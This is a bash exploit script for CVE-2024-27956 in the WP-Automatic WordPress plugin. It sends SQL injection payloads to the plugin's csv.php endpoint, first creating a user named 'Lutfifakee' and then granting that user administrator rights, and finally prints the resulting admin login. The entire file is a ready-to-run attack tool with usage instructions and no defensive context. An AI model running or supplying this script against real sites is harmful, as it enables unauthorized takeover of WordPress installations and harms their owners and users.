#!/bin/bash

makeRequest() {
    local payload="$1"
    local hash="$2"
    local url="$3"
    local host
    host=$(echo "$url" | cut -d'/' -f3)

    read -r -d '' headers <<EOF
Host: $host
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1
EOF

    read -r -d '' data <<EOF
q=$payload
auth=$(echo -n '\0' | base64)
integ=$hash
EOF

    response=$(curl -s -X POST -d "$data" -H "$headers" "$url")
    echo "$response"
}

helpUsage() {
    echo "[+] You must run the exploit passing the wordpress URL."
    echo "[+] Example: ./exploit.sh https://github.com/X-Projetion/"
    exit 1
}

verifyArgs() {
    if [ "$#" -ne 1 ]; then
        helpUsage
    fi
}

verifyArgs "$@"
echo "[+] Exploit for CVE-2024-27956"
domain="$1"
url="$domain/wp-content/plugins/wp-automatic/inc/csv.php"

# First request (create user)
echo "[+] Creating user Lutfifakee"
response=$(makeRequest "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('Lutfifakee', '\$P\$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'Lutfifakee', 'Lutfifakee@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'Lutfifakee')" "09956ea086b172d6cf8ac31de406c4c0" "$url")
if [[ "$response" == *"Tampered query"* || "$response" == *"invalid login"* || "$response" == *"login required"* ]]; then
    echo "[+] Error in the payload"
    exit 1
fi

if [[ "$response" != *"DATE"* ]]; then
    echo "[+] Not vulnerable"
    exit 1
fi

# Second request (give permission)
echo "[+] Giving Lutfifakee administrator permissions"
response=$(makeRequest "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'Lutfifakee'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')" "bd98494b41544b818fa9f583dadfa2bb" "$url")
if [[ "$response" == *"Tampered query"* || "$response" == *"invalid login"* || "$response" == *"login required"* ]]; then
    echo "[+] Error in the payload"
    exit 1
fi

echo "[+] Exploit completed!"
echo "[+] administrator created: Lutfifakee:admin"
